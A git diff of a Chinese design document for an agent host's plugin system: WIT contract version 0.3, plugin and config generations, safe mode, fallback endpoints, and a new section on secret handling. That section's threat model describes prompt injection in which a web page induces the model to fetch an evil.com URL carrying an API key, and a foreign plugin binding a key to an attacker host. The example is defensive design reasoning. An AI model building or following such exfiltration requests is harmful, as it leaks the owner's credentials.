@@ -35,7 +35,7 @@
 
 宿主持有 WebSocket、长轮询、定时器、Webhook 路由和插件状态；插件导出反应函数，按 §3.6 返回转移。
 
-- **资源是声明式的。** `describe(config)` 返回插件需要的资源（连接、定时、Webhook 路由，每项有稳定的名称，宿主按插件身份划分它们的命名空间，所以改名不会触发重建），宿主负责对账：没变的保留，变了的重建，删掉的撤销。这与 §4.7 的"期望状态 / 实际状态"是同一个模式。用户创建的定时是内核事实，通过 `schedule_create` 创建，不属于插件资源。
+- **资源是声明式的。** `describe(config)` 返回插件需要的资源（连接、定时、Webhook 路由，每项有稳定的名称，宿主按插件身份划分它们的命名空间，所以改名不会触发重建），宿主负责对账：没变的保留，变了的重建，删掉的撤销。这与 §4.7 的"期望状态 / 实际状态"是同一个模式。凭证也是这样的资源：插件声明放置方式，宿主持有值，在传输层代入（§4.11）。用户创建的定时是内核事实，通过 `schedule_create` 创建，不属于插件资源。
 - **替换渠道插件时，默认在事件边界切换回调。** 如果新代码接续不了当前的协议状态（在 `describe` 中声明 `reconnect-on-upgrade`，或者连接选项发生了变化），就按协议重连并补收：Telegram 用 offset，Discord 用 RESUME。连接级的传输状态（例如流式解压）属于宿主传输层的连接选项，不是插件状态。**承诺的是可恢复，不是每次替换都零断线。**
 - **渠道故障转移**：由新的租约持有者重建连接，从已复制的连接状态继续。
 
@@ -49,14 +49,17 @@
 
 ## 4.4 契约（WIT 草图）
 
-`completion`、`embedding` 和 `lifecycle` 已在 P1 定稿为 0.2。`decision` 在 0.2.1 加入：同一主版本内只增不改，已部署的 0.2.0 制品照常加载（§4.10）。`tools` 随 P2 的第一个工具插件定稿，`channel` 在 P3 定稿，`state-get` 等到第一个有状态的插件出现时再加入。
+`completion`、`embedding` 和 `lifecycle` 已在 P1 定稿为 0.2。`decision` 在 0.2.1 加入：同一主版本内只增不改，已部署的 0.2.0 制品照常加载（§4.10）。
+
+**主版本只放必须破坏的改动，新增的接口与导入随第一个使用者以次版本加入。** 0.3 改动的是现有的记录：`describe` 返回摘要、配置 schema 与凭证声明，`settings` 删除 `api-key`，`http` 增加凭证语义（§4.11）。`tools` 与宿主导入 `config()` 随第一个工具插件以 0.3.x 加入，`channel` 在 P3，`state-get` 等到第一个有状态的插件。这样每个接口都随它真实的使用者定稿，而不是在使用者出现之前定死。下面的草图是 0.3 的形态，当前实现见 `wit/plugin.wit`。
 
 ```wit
-package enco:plugin@0.2.1;
+package enco:plugin@0.3.0;
 
 interface types {
   type json = string;
   record failure { code: string, message: string, retryable: bool }
+  record settings { base-url: string, model: string, options: json }   // 调用参数，由导入方给出；密钥不在其中（§4.11）
   variant outcome { ok(json), failed(failure), unknown(failure) }   // unknown = 可能已执行
   record blob-ref { hash: string, mime: string, size: u64 }
   record call-context { session: string, round: string, call-id: string, node: string, result-budget: u32 }   // 结果可内联的字节数（§6）
@@ -70,18 +73,19 @@ interface types {
 interface host {
   use types.{blob-ref};
   log: func(level: log-level, message: string);
+  config: func() -> json;                                  // 本次调用所属代际的插件配置（§4.11）
   state-get: func(key: string) -> option<list<u8>>;       // 读已提交的快照
   blob-put: async func(mime: string, data: stream<u8>) -> blob-ref;   // 内容寻址，幂等
   blob-read: async func(r: blob-ref) -> stream<u8>;
   exec: async func(req: exec-request) -> result<exec-output, string>;
-  http: async func(req: http-request) -> result<http-response, http-failure>;   // 带 request-sent
+  http: async func(req: http-request) -> result<http-response, http-failure>;   // 带 request-sent；宿主按 origin 代入凭证（§4.11）
 }
 
 interface tools {
   use types.{json, call-context, call-result};
   enum effect { read-only, idempotent, side-effect }
   record tool-spec { name: string, description: string, input-schema: json, effect: effect }
-  list-tools: func() -> list<tool-spec>;
+  list: func(config: json) -> list<tool-spec>;             // 登记时以候选配置求出，随代际固定
   call: async func(ctx: call-context, name: string, input: json) -> call-result;
 }
 
@@ -122,7 +126,10 @@ interface decision {
 }
 
 interface lifecycle {
-  describe: func(config: json) -> result<description, failure>;   // 一句话摘要；以后加贡献、所需资源、状态作用域、reconnect-on-upgrade；不含插件名（§4.10）
+  variant placement { header(tuple<string, string>), path-prefix(string) }   // 请求头名与前缀；或路径前缀
+  record credential { name: string, placement: placement, origin: option<string>, required: bool }   // origin 为空时由导入方给出
+  record description { summary: string, config-schema: json, credentials: list<credential> }
+  describe: func(config: json) -> result<description, failure>;   // 候选配置的纯函数，也是插件对配置的校验；以后加所需资源、reconnect-on-upgrade；不含插件名（§4.10）
   probe: async func() -> result<_, failure>;     // 自检；只依赖宿主持有的 fixture，不依赖外部服务
 }
 
@@ -144,8 +151,27 @@ world base { import host; export lifecycle; }
 | 名称 | 是什么 | 寿命 |
 |---|---|---|
 | **制品**（Artifact） | 不可变的组件文件，按内容哈希寻址，复用 `InstancePre` | 永久（可垃圾回收） |
-| **代际**（Generation） | 一份已登记的插件实现 = `(单调编号 n, 制品哈希, 配置引用)`。编号取注册表的全局提交序号，而不是每个插件各自计数，所以一个代际引用本身就是完整的，不依赖插件名或身份。同一份制品配上不同的插件配置（`describe(config)` 的输入）是不同的代际，所以凡是随插件配置变化的东西都属于代际：健康状态、运行时手册（§7.5），以及 Log 中 Attempt 与调用记录的代码引用。配置引用指向配置的某个版本，不内联其内容。调用参数（例如 Provider 的 base_url、model、options）由导入方的配置提供，属于接线，不属于代际（§4.6） | 记录持久保存，是否活跃可以改变 |
+| **代际**（Generation） | 一份已登记、可以试用与回退的实现。编号取注册表的全局提交序号，而不是每个插件各自计数，所以一个代际引用本身就是完整的，不依赖插件名或身份。**插件代际** = `(编号, 制品哈希, 这个插件的全部设置)`，设置是 `config.toml` 中 `[plugin.<名字>]` 整节（§4.11）；凡是随设置变化的东西都属于它：健康状态、运行时手册（§7.5），以及 Log 中 Attempt 与调用记录的代码引用。**配置代际** = `(编号, 不属于任何插件的设置)`，即接线与内核配置：profile、endpoint、timezone 等 | 记录持久保存，是否活跃可以改变 |
 | **调用**（Invocation） | 一次逻辑调用，独占一个 Store；作用域覆盖导出函数、它返回的全部 stream/future，以及最终结算 | 到结算为止（不是到导出函数返回为止） |
+
+**两种参数，按由谁选定区分。** 插件配置由主人为这个插件选定，随代际固定，调用时经宿主导入 `config()` 读取；调用参数由调用方在每次调用时选定，是函数参数，记在这次调用里，例如工具的输入，以及 profile 按 Attempt 用途选定的 Provider 的 `base_url`、`model`、`options`（§4.6）。判据是同一个代际要不要同时以两种取值被使用：一个插件只有一个活跃代际，所以要同时以两种取值使用的只能是调用参数，例如同一个 Provider 代际同时服务回复模型与压缩模型；会改变模型可见文本的只能是插件配置（§4.10 第 5 条），例如 web 插件启用了哪些搜索引擎。判据看值由谁选定，不看插件类型。
+
+**登记只有一个流程：校验，然后由注册表提交。** 校验就是登记去掉提交：加载、`describe`、probe、准入（§4.10），以及对改变了的 endpoint 的真实调用（§4.6）。两个入口都是有意的命令：
+
+- **部署**提交新制品，设置取生效中的那份。
+- **应用配置**（`enco config apply` 与工具 `config_apply` 同源）提交 `config.toml`：与活跃代际相同的部分跳过，其余按目标状态整体校验，任何一处失败就整次拒绝；通过之后，新的配置代际与设置变了的插件代际（活跃制品 + 新设置）在一个事务里写入。一次应用就是一次提交，准入按最终状态检查，没有先后顺序的问题。
+- 校验在锁外进行，可能要几十秒，而登记从活跃代际继承了一半：部署继承设置，应用配置继承制品。所以登记与激活一样携带期望的活跃代际（§3.6 规则二），提交时任何一项不一致就整次拒绝，重新执行即可。
+
+没有后台对账：有意的修改是命令，其余都是已登记事实的纯函数。
+
+**生效与恢复。** 新代际在其归属者的边界生效（§3.6 规则一）：插件代际在 Round 边界；profile 与 endpoint 在 Round 开始时与能力快照一起钉住；timezone 由 Scheduler 立即重新推算；embedding 由记忆的归属者重建派生索引；渠道由连接 actor 按协议重连并补收。
+
+- **重启只恢复活跃代际**，不读取 `config.toml` 的新内容，所以 `config.toml` 写坏了，节点照常启动。两者不一致时启动日志给出警告；`enco status` 区分"从未应用"与"已登记为代际 N、又被回退，原因是……"，后者从代际历史中查出。
+- **全新的 home** 首次启动时，把 `config.toml` 登记为第一批代际，直接为健康；此时 `config.toml` 无效就拒绝启动，因为没有可以保留的东西。
+- **出厂代际** = 当前二进制的出厂制品 + `{}`，由宿主在启动时登记，直接为健康，安全模式运行它（§4.6）。`{}` 必然合法，所以它加载失败说明宿主本身坏了；它也与主人的设置无关，坏设置因此进不了安全模式。
+- **宿主升级**带来新的出厂字节时，活跃代际运行的是某一版出厂制品的插件，以新制品与生效中的设置走一次部署，校验不通过就保留原来的活跃代际并警告；主人部署过自己代码的插件不跟随。
+
+**提交与在途工作。**
 
 - **发布**：构建与校验可以并发进行，提交则只经过唯一的部署提交者，顺序是：制品完整写入 → 兼容性检查 → 在 SQLite 事务中提交代际记录 → 发布内存快照（`ArcSwap`）。如果在最后两步之间崩溃，重启后按数据库重建快照。Round 开始时执行 `load_full()`。
 - **回收**：`Arc` 只负责代码的回收。在途工作由调用记录（它本来就在 Log 里）说明。
@@ -161,9 +187,22 @@ world base { import host; export lifecycle; }
 
 - 试用代际失败时自动回退。晋升和回退都携带期望的当前代际与状态（§3.6），迟到的结果改不动之后的路由。代际被标为失败时，注册表在同一次提交中记下原因，`plugin_status` 可以查到。回退由某个 Session 的调用触发时，同一次提交还向它投递 `deploy.rolled_back` Event。回退可能使依赖其导出的插件退出快照，原因写入 Log（§4.10）。
 - **健康只统计能归因于代际本身的失败**：trap、契约违规、宿主持有的确定性 fixture 失败。网络中断、限流、凭证失效等外部失败由宿主分类，不会触发回退，因为它们在所有版本上都一样。"前 N 次没有 trap"只说明运行层面健康，不说明语义正确；语义正确靠 fixture 和契约测试。
+- **失败信号按来源区分**，生命周期统一：
+  - **插件代码**（包括只改设置产生的插件代际）：trap、契约违规、probe 失败，试用中自动回退。
+  - **接线**：应用配置时，对改变了的 endpoint 各做一次真实的最小调用（补全发一条极短的请求，嵌入检查维度，decision 问一个简单的问题），失败就整次拒绝，坏接线不会生效。配置代际因此登记即为健康，没有运行时的试用。真实调用不是 probe：probe 检查插件代码，只用宿主持有的 fixture。
+  - **外部服务**：网络、限流、欠费、凭证失效在所有版本上都一样，不回退，由 profile 列出的备用 endpoint 依次接替（见下面的 Provider 与 Attempt）。
+  - **能否继续思考**：正常路径的 Round 失败时进入安全模式（见下面的安全模式）。安全模式换的是插件代际，配置代际仍是活跃的那份，所以坏接线只能在应用时拦下；两者合起来才兑现 §1.2。
+  - **语义退化**：以后靠评测（路线图"之后"）。
+  - 不用"换回去比较"来归因：比较只能看出新旧不同，看不出哪个更对，而更严格的修正必然比旧版本失败得多，例如拒绝不完整的模型响应。
+  - 放弃的一种情况：救生集之外的插件代码坏了，却只返回普通失败，不自动回退。这些失败对模型可见，Agent 可以手动回退或重新部署，修复能力不受影响。
 - **出厂代际是内置的候选，不保证一定能用**：它仍然依赖兼容的 Host 接口、有效的配置和凭证，以及外部服务。
-- **Provider 与 Attempt**：一个 Round 内可以有多次模型尝试（Attempt）。每次 Attempt 按用途（Reply、Compaction，委派落地后加上 Brief）使用 Session 配置为该用途接上的 `completion` 导出，所以同一个 Session 可以用大模型回复、用小模型压缩。每次 Attempt 记录完整的请求（ContextPlan 引用、Provider 代际，以及按内容寻址的调用参数中非密钥的部分：base_url、model、options 与密钥所在的环境变量名）和结果。只有成功结算的那次 Attempt 的工具调用会被分派，失败尝试迟到的 token 一律丢弃。Provider 失败后改用健康代际，就是开始一次新的 Attempt；如果旧代际无法表达当前请求，就在明确的边界上重新组装。**工具绑定以 Round 为单位固定，模型请求与适配器以 Attempt 为单位固定。**
-- **安全模式**：所有策略点（`round.compose`、`inbound.preprocess`、`tool.gate`）改用原生出厂实现，Provider 使用出厂代际，只暴露救生集，不加载普通 Skill 和 Observer，使用最小系统提示词。正常路径连续失败时自动进入，主人也可以手动进入。它是 **Agent 自愈的唯一起点**。
+- **Provider 与 Attempt**：一个 Round 内可以有多次模型尝试（Attempt）。每次 Attempt 按用途（Reply、Compaction，委派落地后加上 Brief）使用 Session 的 profile 为该用途列出的 endpoint，所以同一个 Session 可以用大模型回复、用小模型压缩。每次 Attempt 记录完整的请求（ContextPlan 引用、Provider 代际，以及按内容寻址的调用参数中非密钥的部分：base_url、model、options 与密钥所在的环境变量名）和结果。只有成功结算的那次 Attempt 的工具调用会被分派，失败尝试迟到的 token 一律丢弃。Provider 失败后改用健康代际，就是开始一次新的 Attempt；如果旧代际无法表达当前请求，就在明确的边界上重新组装。**工具绑定以 Round 为单位固定，模型请求与适配器以 Attempt 为单位固定。**
+  - **备用 endpoint**：每个用途的 endpoint 是一个有序列表，第一个是首选；备用 key 就是另一个 endpoint。一个 endpoint 的重试用尽后改用下一个，也是一次新的 Attempt，并为它重新组装：计划按 endpoint 的窗口组装，composer 也借此写明换用的原因。本 Run 中用尽过的 endpoint 在快照改变之前跳过，与安全模式是同一条规则。embedding 换模型就换了向量空间，所以不设列表。
+  - 每个恢复机制落在它所改变之物被固定的那一层：重试、回退与换 endpoint 在 Attempt 层，安全模式在 Round 层。两者正交，安全模式的 Round 里同样从列表第一个开始。
+- **安全模式**：所有策略点（`round.compose`、`inbound.preprocess`、`tool.gate`）改用原生出厂实现，插件使用出厂代际（§4.5），配置代际仍是活跃的那份，只暴露救生集，不加载普通 Skill 和 Observer，使用最小系统提示词。它是 **Agent 自愈的唯一起点**。
+  - **进入**：主人手动打开；或者正常路径的 Round 以失败结束，即 Attempt 层的重试、回退与备用 endpoint 都已用尽，或者组装本身失败。不设阈值，不区分失败来源：安全模式救不了的失败，再失败一次几乎没有代价。失败的 Round 只停在组装或模型请求阶段，没有分派任何工具，所以换成安全模式重来是安全的。
+  - **保持到快照改变**：失败记在失败那一刻的快照上，Round 内的自动回退算在失败之前。之后任何一方部署、回退或应用配置，下一个 Round 就重新走正常路径，Agent 的修复因此立即得到验证；否则本 Run 一直留在安全模式，新的 Run 从正常路径开始。是否处于安全模式只取决于主人的开关与本 Run 的 Log，没有需要退出的状态。
+  - 安全模式中的 Round 失败，Run 就失败。composer 写明进入安全模式的原因与回到正常路径的条件。
 - **机械恢复不依赖模型**：原生管理入口（本地 CLI/HTTP）可以列出代际、查看日志、停用插件、选择旧配置、进入安全模式和重启，模型完全不可用时也能操作。它不可被插件替换。Android 上需要一个不依赖 WebView 或聊天渠道的原生入口。
 - 同伴节点可以通过 `invoke(node, shell_exec, …)` 诊断彼此。
 - **宿主切换必须经主人确认。** Agent 可以自主完成宿主的构建、测试和预检，然后把"切换到宿主 vN+1"作为待确认命令提交（§6 Approval）；主人确认后由 supervisor 执行，健康检查失败则自动回滚到上一个二进制。自主切换的权限以后通过显式授权开通。宿主自更新整体排在路线图后期。
@@ -171,10 +210,10 @@ world base { import host; export lifecycle; }
 
 ## 4.7 期望状态与系统代际
 
-- **期望状态**放在控制平面，线性一致：`插件身份 → 代际`（制品哈希 + 配置引用）、按来源记录的已批准导入集合（§4.10），以及配置和 skills 的 git 引用。在任何节点上修好一个插件，其他节点都会收到。
+- **期望状态**放在控制平面，线性一致：`插件身份 → 代际`（制品哈希 + 设置）、活跃的配置代际、按来源记录的已批准集合（§4.10），以及 skills 的 git 引用。在任何节点上修好一个插件，其他节点都会收到。
 - **实际状态**按节点记录：只有通过准入（§4.10）的代际进入快照，健康状态也按节点记录。
 - **制品**按哈希向同伴拉取（类似 Nix binary cache）。
-- **系统代际** = `(宿主版本, 活跃插件代际, 配置提交, skills 提交)`，可以命名、比较和整体回滚。新设备加入时采用期望状态，就得到同一套能力。
+- **系统代际** = `(宿主版本, 活跃插件代际, 活跃配置代际, skills 提交)`，可以命名、比较和整体回滚。新设备加入时采用期望状态，就得到同一套能力。
 
 ## 4.8 自我修改闭环
 
@@ -194,12 +233,14 @@ world base { import host; export lifecycle; }
 
 意图与运行时状态由目录分开：仓库里看得见的是主人的意图，`.data/` 与 `.git/` 同属工具自己管理的目录。
 
-- 命令（CLI 与 Agent Tool 同源，Tool 名为 `plugin_<动作>`）：`scaffold / build / test / deploy / status / rollback / logs / rename / remove`；外来插件另有 `install / update`。`scaffold`、`install`、`update`、`rename`、`remove` 维护 `plugins.lock`，`build` 登记尚未登记的目录（§4.10）。
+- 命令（CLI 与 Agent Tool 同源，Tool 名为 `plugin_<动作>`）：`scaffold / build / deploy / status / rollback / rename / remove`；外来插件另有 `install / update`。`scaffold`、`install`、`update`、`rename`、`remove` 维护 `plugins.lock`，`build` 登记尚未登记的目录（§4.10）。配置经 `enco config apply` 与同源的工具 `config_apply` 生效（§4.5）。回退配置是原生管理入口的机械恢复（`enco config rollback`，§4.6），不作为 Agent 的工具：Agent 撤销配置就是把 `config.toml` 改回去再应用，两者因此保持一致。插件的诊断经失败消息进入 Log 与 `plugin_status`；`log` 导入的输出属于宿主日志，供主人排查。
 - `plugin_build` 是只由装有工具链的节点导出的能力，手机上的 Agent 通过 `invoke(vps, plugin_build, …)` 构建，再按哈希取回制品。
 - 构建诊断是结构化的，只返回前 N 条，完整日志存为 blob。构建以插件目录的内容快照为输入（构建前自动提交该目录，避免未提交的修改与产物对不上），每个代际记录 `{plugin_id, 源码快照, Cargo.lock 摘要, artifact_hash, wit_version, toolchain, config_ref}`。
+- 插件经 git 依赖 Enco 仓库中与宿主版本对应的 `enco-sdk`（内含 WIT），Cargo.lock 把它锁定到提交，所以上面的记录足以复现构建。出厂插件的源码就是那个版本下的目录，复制进 `plugins/<保留名>/` 即可修改。离线节点用 Cargo 的标准做法（缓存、`cargo vendor`、源替换）。这是插件生态开放之前的形态，开放时换成按 semver 发布（§4.10）。
 - 构建时以空配置更新插件 README 中的生成区；部署时以新代际的配置生成它的运行时手册（§7.5、§7.6）。
 - git 仓库在节点之间同步对象，`main` 的推进是控制平面上的 CAS（§5.5）。
 - **评测**衡量自我修改的效果，任务集在仓库根目录的 `evals/`。运行器 `evals/runner/` 是 Enco 的黑盒客户端：每道题用一个全新的 `ENCO_HOME`，经 `enco send` 输入，只读取管理命令输出的 JSON（`log`、`status`、`inspect` 等），评分在 Enco 之外进行。一道题就是一个 Session，不引入新概念；Attempt 记录的代际与调用参数说明成绩对应哪份代码、哪个模型，Log 中的完整请求让每次失败都能回放。评分只看公开的表面，与插件只看 WIT 是同一条纪律。§4.6 的 fixture 与契约测试检验语义正确，评测检验任务层面的效果。
+- **评测的产出是比较，不是分数。** 进化要回答的是"这次改动是否更好"：两个变体（二进制 + 被测的代际）在同一时间窗口内交错运行同一批题，结论回答进化时的问题：目标题上是否更好，其余每道题是否没有倒退。服务商会在同一个模型名下更新模型，所以存下的分数不能跨时间比较。测量工具不随被测对象改变：评判由运行器以固定的模型与提示词直接调用，不经被测的 Enco。
 - 评测材料只放在题目的 `hidden/` 中，不进入被测的 home。Agent 拥有完整的系统权限（§1.2），所以当它开始对着任务集自我进化时，留出集要放到它够不着的地方（另一个节点或另一个系统用户），否则成绩的提升可能只是记住了答案。
 
 ## 4.9 状态与迁移
@@ -267,7 +308,7 @@ ULID 不进入 Log 条目。代际记录里有身份，需要跨改名追溯时�
 | 内核与宿主的导入 | 数量 | 选择写在哪里 |
 |---|---|---|
 | composer | 一个 | Session 配置 |
-| `completion` | 每种 Attempt 用途一个 | Session 配置 |
+| `completion` | 每种 Attempt 用途一个有序列表，依次接替（§4.6） | Session 配置 |
 | 策略点（`inbound.preprocess`、`tool.gate`） | 一个 | 节点配置 |
 | 工具、Context 贡献、Observer、渠道 | 全部 | — |
 | 宿主：`embedding`（记忆的检索索引） | 一个 | 节点配置 |
@@ -283,11 +324,11 @@ ULID 不进入 Log 条目。代际记录里有身份，需要跨改名追溯时�
   - 这两条都由契约 lint 检查（§7.3）。
 - 模型调用工具，代码导入接口。插件不按名字调用其他插件的工具。模型在 Round 中写下的脚本属于前者：它依据本 Round 披露的定义写成，执行一次即丢弃，其中的调用由内核逐个分派（§7.1）。
 
-**3. 准入：导入都接上的代际才进入快照。**
-- 准入结果只由本节点各插件的活跃代际、接线和 Host 接口决定，与到达这个状态的路径无关。所以部署、回退和启动都从 Host 出发，对整份快照逐层计算：导入全部接到 Host 或已准入插件的导出，代际才准入。不满足的代际连同原因写入 Log，对模型可见。
+**3. 准入：导入都接上、必需凭证齐备的代际才进入快照。**
+- 准入结果只由本节点各插件的活跃代际、接线、Host 接口和凭证决定，与到达这个状态的路径无关。所以部署、回退和启动都从 Host 出发，对整份快照逐层计算：导入全部接到 Host 或已准入插件的导出、声明为必需的凭证在本节点都能取到（§4.11），代际才准入。不满足的代际连同原因写入 Log，对模型可见。
 - 插件之间的接线因此必须无环：环上的插件互相等待，都不会准入，原因中列出环上的插件。这与加载无关，插件没有启动顺序。两个插件互相需要，通常说明缺一个共同的归属者（§3.6）。
-- 部署是有意的命令，不能拆掉正在使用的接线；被拒绝时，错误信息指出使用者和下一步。
-- 回退是机械恢复，可以拆掉接线；受影响的插件退出快照并记录原因，因为恢复不能依赖被替换的东西本身。
+- 部署与应用配置是有意的命令，不能拆掉正在使用的接线，也不能登记本节点缺少必需凭证的代际；被拒绝时，错误信息指出原因和下一步。Session 选用的 profile 也是接线：应用配置删掉或改名一个仍有 Session 在用的 profile 时整次拒绝，并列出这些 Session。
+- 回退是机械恢复，可以拆掉接线；受影响的插件退出快照并记录原因，因为恢复不能依赖被替换的东西本身。重启时环境变量变了也是如此：缺少凭证的代际只退出快照，节点照常启动。
 - `plugin_status` 显示每个插件的导入、导出、使用者，以及它在各节点上是否准入、未准入的原因。
 
 **4. 演进：只有代码消费者需要兼容规则。**
@@ -297,7 +338,7 @@ ULID 不进入 Log 条目。代际记录里有身份，需要跨改名追溯时�
 
 **5. 信任：只在外来代码进来时检查。** 插件作者不是 Space 的成员，他们的代码在主人的授权下运行，权限就是它的导入。Wasm 保证插件只能调用它导入的接口，而导入可以从制品中读出，所以不需要手写权限清单。
 
-- 安装与更新都是采纳外来修订。采纳后的导入如果超出该来源已批准的集合，采纳就进入待确认状态（§6 主人确认），确认之前仓库和运行中的代际都不变。
+- 安装与更新都是采纳外来修订。已批准的集合包括导入，以及用当前配置求出的凭证 (名字, origin)（§4.11）；采纳后其中任一项超出该来源已批准的集合，采纳就进入待确认状态（§6 主人确认），确认之前仓库和运行中的代际都不变。否则一次更新不加导入，只把凭证的 origin 改到别处，主人的映射就会把密钥送过去。主人自己改配置使 origin 变化，走的是应用配置，不经过采纳检查。
   - 首次安装时已批准的集合为空，所以总要确认；更新只在扩权时确认，这与 Chrome 扩展的做法相同。
   - 已批准的集合按来源记录在期望状态中（§4.7），因为信任的是这个来源的代码。改名不影响信任；换成另一个来源的插件，或者仓库迁移，都从空集合重新确认。仓库迁移也可能意味着仓库换了主人，GitHub 的 repojacking 就发生在这种时候。
 - 部署路径对所有插件相同，不看来源。Agent 本来就有 shell，限制它能修改哪些代码没有意义。
@@ -317,4 +358,43 @@ ULID 不进入 Log 条目。代际记录里有身份，需要跨改名追溯时�
 - 加载顺序与启动阶段。
 - 优先级数字与运行时覆盖。
 - 库插件与插件继承：共享代码是 crate，在编译期静态链接。
-- 多插件原子部署：expand-contract 已经够用，Space 中有旧节点时本来就必须这样做（§4.9）。
+- 多插件原子部署：多个插件代码之间的协调升级由 expand-contract 解决，Space 中有旧节点时本来就必须这样做（§4.9）。一次应用配置在一个事务里提交（§4.5），那是一份配置的一次提交，不是这里说的协调升级。
+
+## 4.11 配置与密钥
+
+**配置的布局。** `config.toml` 中每个插件一节，分两部分，与 `[endpoint.*]` 同构（`options` 原样交给插件，其余字段由宿主读）：
+
+```toml
+[plugin.web.config]          # 交给插件：describe(config)、tools.list(config) 与调用时的 config()
+search = ["exa", "tinyfish"]
+
+[plugin.web.secrets]         # 只由宿主读取：插件声明的凭证名 → 环境变量
+exa = "EXA_KEY"
+```
+
+两部分一起属于这个插件的代际（§4.5）：需要哪些凭证由配置决定，两者放在一起，任何一次逐个回退都落在自洽的状态上。不属于任何插件的设置（profile、endpoint 及其 `api_key_env`、timezone、渠道等）属于配置代际。
+
+- **没写就是 `{}`，`{}` 必须合法，得到最小能力**：README 生成区本来就以空配置求出（§7.5）。最小能力可以是没有工具。
+- **描述函数显式接收候选配置，调用函数经 `config()` 读取所属代际的配置。** `describe(config)` 与 `tools.list(config)` 处理的是还没有成为代际的候选配置，签名写明了它们是配置的纯函数；它们的输出在登记时求出，随代际固定。`config()` 只读、读取已提交的事实，任何接口的插件都能拿到自己的配置，不必在每个函数上加同一个参数。
+- **校验只在插件里**：宿主不认识插件的字段（§4.1），校验由 `describe` 完成。`describe` 另外返回 `config-schema`，只用来生成手册的"配置项"（§7.4），宿主不按它再校验一遍。
+- 改名会让 `config.toml` 中按旧名字写的节失效，由启动警告与 `enco status` 报出。
+
+**密钥：插件永远看不到值。** 要防的，按现实程度排序：插件的缺陷把密钥写进 Log 或工具结果（对模型可见、在 Space 中复制、永不删除；从 P2 起插件由 Agent 编写和修改，这最可能发生）；提示注入诱导插件把密钥带到别的地址；外来插件的代码把密钥发往别处。不防 Agent 本身：它拥有完整的系统权限（§1.2），可以读进程的环境变量。
+
+把值交给插件，无论按调用传入还是经宿主导入读取，上面三种泄露都取决于每个插件作者。所以宿主在传输层代入：插件的缺陷写不出它没见过的值；密钥只发往绑定的 origin，提示注入和外来插件都带不走；采纳外来插件时，主人审核的是"能以哪个凭证访问哪个地址"（§4.10 第 5 条）。
+
+**一个凭证 = 插件声明的放置方式 + 选定参数的一方给出的 origin 与值。** 用的是 §4.5 两种参数的同一条判据：
+
+| 插件 | origin | 值 |
+|---|---|---|
+| 有自己配置的插件（例如 web、渠道） | 插件根据自己的配置求出 | `[plugin.<名字>.secrets]` 映射的环境变量 |
+| Provider（completion、embedding、decision） | endpoint 的 `base_url` | endpoint 的 `api_key_env` |
+
+宿主每次调用时，为这次调用的 `http` 准备一组 (origin, 放置方式, 值) 的绑定。Provider 不是特例，系统中只有一条密钥路径。
+
+- **声明**：名字、放置方式（请求头名与前缀，或路径前缀，例如 Telegram 的 `/bot<token>`）、origin（插件自己的凭证才有）、是否必需。放置方式是 WIT 的 variant，发布后加一种就是破坏性变化，所以只定下有确定使用者的种类；查询参数与请求签名等到第一个需要它们的服务。
+- **结构化的放置方式，而不是占位符替换。** 让插件在 URL 里写 `{{secret:jina}}`、宿主替换，看似更通用，却会被利用：Jina Reader 是代理式接口，网页诱导模型抓取 `https://evil.com/?k={{secret:jina}}`，插件构造出的请求 origin 是 `r.jina.ai`，替换成立，Jina 随后带着这个 key 访问 evil.com。只要不可信输入能出现在发往绑定 origin 的请求里，占位符就不安全；结构化的放置方式只由宿主写入固定位置。
+- **映射由主人写、由宿主读。** 能用哪些密钥必须由主人决定：如果变量名写在插件配置里、再由插件带回，宿主就是按插件的要求读环境变量，外来插件可以声明"把 `OPENAI_API_KEY` 绑定到 evil.com"。映射只记变量名，值从不记录；值来自进程的环境变量，轮换密钥要重启。
+- **附加**：去往绑定 origin 的每个请求自动带上凭证，`http-request` 不变。同一插件的两个凭证不能绑定同一个 origin。
+- **重定向**：宿主自己跟随重定向，每一跳都是一个请求，按它自己的 origin 附加凭证，跨 origin 的跳转因此不带凭证。
+- **交回插件的一切都不含密钥值**：失败消息不带 URL，响应头与正文中出现的值替换为 `[redacted:<名字>]`。经过编码的形式（URL 编码、base64）不在替换之列。宿主日志不输出注入之后的 URL 与请求头。
